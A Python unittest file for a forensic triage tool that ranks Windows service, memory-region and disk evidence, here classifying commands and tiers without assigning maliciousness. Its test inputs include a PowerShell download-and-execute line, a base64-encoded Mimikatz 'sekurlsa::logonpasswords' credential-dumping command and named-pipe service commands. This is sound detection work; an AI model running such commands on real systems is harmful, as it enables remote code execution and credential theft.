import base64
import json
import tempfile
import unittest
from datetime import datetime, timezone
from pathlib import Path

import memlink_rank as rk

SPEC = rk.Spec(str(Path(__file__).resolve().parents[1] / 'rules' / 'assessment.v1.draft.json'))
MAP = {'\\SystemRoot': 'C:\\Windows', '\\Windows': 'C:\\Windows'}
CAPTURE = datetime(2020, 1, 2, tzinfo=timezone.utc)
PS = lambda text: base64.b64encode(text.encode('utf-16-le')).decode()


def event(name, image, utc='2020-01-01T00:00:00.1234567Z', record=1):
    return {'record_id': record, 'utc': utc, 'name': name, 'image_path': image, 'type': 'user mode service',
            'account': 'LocalSystem', 'ref': 'events#line=%d' % record}


def svc_tables(name, binary, pid=None):
    return {'windows.svcscan': [{'Name': name, 'Binary': None, 'Binary (Registry)': binary, 'PID': pid, 'Start': 'AUTO', 'State': 'STOPPED'}],
            'windows.pslist': [], 'windows.psscan': []}


def a01(events, tables, disk=None, reviews=()):
    return rk.build_service_findings(SPEC, events, tables, {'windows.svcscan': 's.json', 'windows.pslist': 'p.json'}, MAP,
                                     disk or {}, CAPTURE, list(reviews))


class CommandTests(unittest.TestCase):
    def test_behaviours_are_closed_and_decoded_not_run(self):
        self.assertEqual(rk.command_behaviors('cmd.exe /c echo x > \\\\.\\pipe\\x'), {'pipe_write'})
        self.assertIn('download_and_execute', rk.command_behaviors("powershell IEX (New-Object Net.WebClient).DownloadString('http://h/x')"))
        self.assertEqual(rk.command_behaviors('cmd.exe /c dir'), set())
        enc = rk.command_behaviors('powershell -enc ' + PS("IEX (New-Object Net.WebClient).DownloadString('u')"))
        self.assertIn('encoded_download_and_execute', enc)
        self.assertIn('encoded_credential_access', rk.command_behaviors('powershell -enc ' + PS('sekurlsa::logonpasswords')))

    def test_encoding_alone_is_not_malicious(self):
        self.assertEqual(rk.command_behaviors('powershell -enc ' + PS('Get-Date Get-Date')), {'encoded_command'})
        self.assertEqual(rk.command_behaviors('powershell -enc !!!notbase64!!!notbase64'), set())

    def test_7_digit_fraction_parses_on_any_python(self):
        self.assertEqual(rk.parse_time('2020-09-19T03:27:49.4998644Z').year, 2020)
        self.assertIsNone(rk.parse_time('garbage'))


class ServiceTests(unittest.TestCase):
    def test_pipe_service_satisfies_predicate_but_stays_below_tier1_without_path_identity(self):
        cmd = 'cmd.exe /c echo a > \\\\.\\pipe\\a'
        f = a01([event('a', cmd)], svc_tables('a', cmd))[0]
        self.assertTrue(f.predicates['A01.1_interpreter_pipe_write_or_download_execute']['satisfied'])
        self.assertEqual(f.groups(), ['service_configuration', 'service_install_event'])
        self.assertEqual(f.identity, 'service_name_and_context')
        self.assertEqual(f.tier(), 2)

    def test_configuration_alone_is_not_suspicion(self):
        f = a01([event('svc', '\\SystemRoot\\System32\\x.exe')], svc_tables('svc', 'C:\\Windows\\System32\\x.exe'))[0]
        self.assertEqual(f.tier(), 3)
        self.assertFalse(any(p['satisfied'] for p in f.predicates.values()))
        self.assertEqual(f.identity, 'service_name_and_context')

    def test_reviewed_content_with_path_and_two_groups_reaches_tier1(self):
        image = 'C:\\Windows\\System32\\x.exe'
        disk = {'c:\\windows\\system32\\x.exe': [{'ref': 'd#1', 'allocated': True, 'md5': None, 'path': 'c:\\windows\\system32\\x.exe'}]}
        subject = 'service|svc|record=1'
        review = {'subject': subject, 'predicate': 'reviewed_malicious_content', 'status': 'reviewed', 'reviewer': 'analyst', 'basis': 'manual'}
        f = a01([event('svc', image)], svc_tables('svc', image), disk, [review])[0]
        self.assertEqual((f.tier(), f.identity, f.temporal), (1, 'resolved_full_path', 'compatible_known'))

    def test_only_status_reviewed_with_reviewer_and_basis_counts(self):
        image = 'C:\\Windows\\x.exe'
        base = {'subject': 'service|svc|record=1', 'predicate': 'reviewed_malicious_content'}
        for bad in (dict(base, status='proposed', reviewer='a', basis='b'), dict(base, status='not_reviewed'),
                    dict(base, status='reviewed', reviewer=None, basis='b'), dict(base, status='reviewed', reviewer='a', basis='')):
            self.assertEqual(a01([event('svc', image)], svc_tables('svc', image), reviews=[bad])[0].tier(), 3)

    def test_contradiction_or_future_event_blocks_tier1(self):
        cmd = 'cmd.exe /c echo a > \\\\.\\pipe\\a'
        mismatch = a01([event('a', cmd)], svc_tables('a', 'cmd.exe /c echo other'))[0]
        self.assertIn('service_command_differs_between_event_and_svcscan', mismatch.contradictions)
        future = a01([event('a', cmd, utc='2021-01-01T00:00:00Z')], svc_tables('a', cmd))[0]
        self.assertEqual(future.temporal, 'contradicted')
        self.assertEqual(future.tier(), 2)

    def test_sub_second_gap_to_whole_second_capture_is_unknown(self):
        cmd = 'cmd.exe /c echo a > \\\\.\\pipe\\a'
        f = a01([event('a', cmd, utc='2020-01-02T00:00:00.5Z')], svc_tables('a', cmd))[0]
        self.assertEqual((f.temporal, f.contradictions), ('unknown', []))

    def test_missing_svcscan_is_recorded_not_negative(self):
        f = a01([event('gone', 'cmd.exe /c echo gone > \\\\.\\pipe\\gone')], {'windows.svcscan': []})[0]
        self.assertIn('no_svcscan_record_found_in_available_inventory', f.notes)
        self.assertEqual(f.groups(), ['service_install_event'])
        self.assertEqual(f.tier(), 2)


class FamilyAccountingTests(unittest.TestCase):
    def test_process_views_count_once_and_unmapped_contributes_zero(self):
        f = rk.Finding(SPEC, 'A03', 's')
        for source in ('volatility.pslist', 'volatility.psscan', 'volatility.malfind', 'volatility.threads', 'volatility.unknown_plugin'):
            f.add(source, 'r', 't')
        self.assertEqual(f.groups(), ['memory_runtime'])
        self.assertEqual(SPEC.unmapped['volatility.unknown_plugin'], 1)
        self.assertEqual(f.evidence[-1]['group'], None)

    def test_context_only_adds_no_group(self):
        f = rk.Finding(SPEC, 'A01', 's')
        f.add('autopsy.blackboard.TSK_OS_INFO', 'r', 't')
        self.assertEqual(f.groups(), [])


class RegionTests(unittest.TestCase):
    def tables(self, extra_instance=False):
        proc = {'PID': 7, 'ImageFileName': 'p.exe', 'CreateTime': '2020-01-01T00:00:00+00:00'}
        psscan = [dict(proc, CreateTime='2019-01-01T00:00:00+00:00')] if extra_instance else []
        return {'windows.pslist': [proc], 'windows.psscan': psscan,
                'windows.malfind': [{'PID': 7, 'Process': 'p.exe', 'PrivateMemory': 1, 'Protection': 'PAGE_EXECUTE_READWRITE',
                                     'Start VPN': 0x1000, 'End VPN': 0x1fff},
                                    {'PID': 7, 'Process': 'p.exe', 'PrivateMemory': 0, 'Protection': 'PAGE_EXECUTE_READWRITE',
                                     'Start VPN': 0x9000, 'End VPN': 0x9fff},
                                    {'PID': 7, 'Process': 'p.exe', 'PrivateMemory': 1, 'Protection': 'PAGE_READWRITE',
                                     'Start VPN': 0xa000, 'End VPN': 0xafff}]}

    def build(self, threads, reviews=(), extra=False):
        return rk.build_region_findings(SPEC, self.tables(extra), {'windows.malfind': 'm.json'}, threads, 't.json', list(reviews))

    def test_only_private_executable_regions_are_candidates(self):
        self.assertEqual(len(self.build([])), 1)

    def test_rwx_alone_or_thread_overlap_alone_is_tier3(self):
        thread = {'PID': 7, 'TID': 1, 'Win32StartAddress': 0x1100, 'CreateTime': '2020-01-01T00:01:00+00:00'}
        self.assertEqual(self.build([])[0].tier(), 3)
        overlap = self.build([thread])[0]
        self.assertEqual(overlap.tier(), 3)
        self.assertEqual(overlap.temporal, 'compatible_known')
        self.assertEqual(len(overlap.review_needed), 2)

    def test_overlap_plus_reviewed_structure_gives_tier2_single_group(self):
        thread = {'PID': 7, 'TID': 1, 'Win32StartAddress': 0x1100, 'CreateTime': '2020-01-01T00:01:00+00:00'}
        review = {'subject': 'region|pid=7|start=0x1000', 'predicate': 'payload_structure', 'status': 'reviewed', 'reviewer': 'r', 'basis': 'b'}
        f = self.build([thread], [review])[0]
        self.assertEqual((f.tier(), f.groups()), (2, ['memory_runtime']))

    def test_pid_reuse_is_a_contradiction_not_ownership(self):
        f = self.build([], extra=True)[0]
        self.assertIn('process_instance_ambiguous_or_absent', f.contradictions)

    def test_thread_before_process_creation_is_contradicted(self):
        thread = {'PID': 7, 'TID': 1, 'Win32StartAddress': 0x1100, 'CreateTime': '2019-06-01T00:00:00+00:00'}
        self.assertEqual(self.build([thread])[0].temporal, 'contradicted')


class RankingTests(unittest.TestCase):
    def test_sort_is_deterministic_and_follows_spec_keys(self):
        a, b, c = (rk.Finding(SPEC, 'A01', n) for n in 'abc')
        for f in (a, b, c):
            f.add('windows.Get-WinEvent|service_install_event', 'r', 't')
        b.add('volatility.svcscan', 'r', 't')
        b.predicate('p', True, 'x')
        c.predicate('p', True, 'x')
        a.identity = 'basename'
        ranked = rk.rank([a, b, c])
        self.assertEqual([f.subject for f in ranked], ['b', 'c', 'a'])
        self.assertEqual(ranked, rk.rank(list(reversed(ranked))))

    def test_maliciousness_is_never_assigned(self):
        cmd = 'cmd.exe /c echo a > \\\\.\\pipe\\a'
        row = a01([event('a', cmd)], svc_tables('a', cmd))[0].as_dict()
        self.assertEqual(row['maliciousness']['verdict'], 'not_assessed')
        self.assertIn('not a maliciousness verdict', row['tier_meaning'])
        self.assertTrue(set(row) >= {'observation', 'correlation', 'maliciousness'})

    def test_unevaluable_actions_are_declared(self):
        self.assertEqual(sorted(rk.NOT_EVALUABLE), ['A04', 'A06', 'A07', 'A08'])


class DiskInventoryTests(unittest.TestCase):
    def test_only_disk_tsk_records_with_resolved_equal_path_match(self):
        lines = [
            {'source_layer': 'disk', 'source_tool': 'autopsy.tsk_files', 'path': 'c:\\windows\\system32\\x.exe', 'allocated': True,
             'md5': 'a' * 32, 'raw': {'meta_addr': 5, 'meta_seq': 2}},
            {'source_layer': 'disk', 'source_tool': 'autopsy.tsk_files', 'path': 'c:\\windows\\system32\\x.exe-slack', 'raw': {}},
            {'source_layer': 'memory', 'source_tool': 'volatility.filescan', 'path': 'c:\\windows\\system32\\x.exe', 'raw': {}},
        ]
        with tempfile.TemporaryDirectory(dir=str(Path(__file__).resolve().parent)) as folder:
            path = Path(folder) / 'evidence.jsonl'
            path.write_text('\n'.join(json.dumps(x, separators=(',', ':')) for x in lines), encoding='utf-8')
            found = rk.disk_paths(str(path), {'c:\\windows\\system32\\x.exe'}, MAP)
        self.assertEqual(list(found), ['c:\\windows\\system32\\x.exe'])
        self.assertEqual(len(found['c:\\windows\\system32\\x.exe']), 1)
        self.assertEqual(found['c:\\windows\\system32\\x.exe'][0]['mft'], [5, 2])


if __name__ == '__main__':
    unittest.main()
